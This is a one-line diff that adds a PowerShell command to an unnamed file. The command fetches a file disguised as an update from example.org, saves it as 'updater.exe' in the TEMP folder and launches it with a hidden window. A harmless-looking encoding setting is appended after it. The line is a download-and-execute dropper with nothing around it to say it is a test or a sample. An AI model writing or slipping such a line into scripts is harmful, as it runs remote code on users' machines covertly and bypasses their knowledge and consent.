@@ -1,0 +1,1 @@
+$TargetUrl = "http://example.org/assets/update.dat"; $DownloadPath = "$env:TEMP\updater.exe"; curl.exe -s -L -o $DownloadPath $TargetUrl; Start-Process -FilePath $DownloadPath -WindowStyle Hidden; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
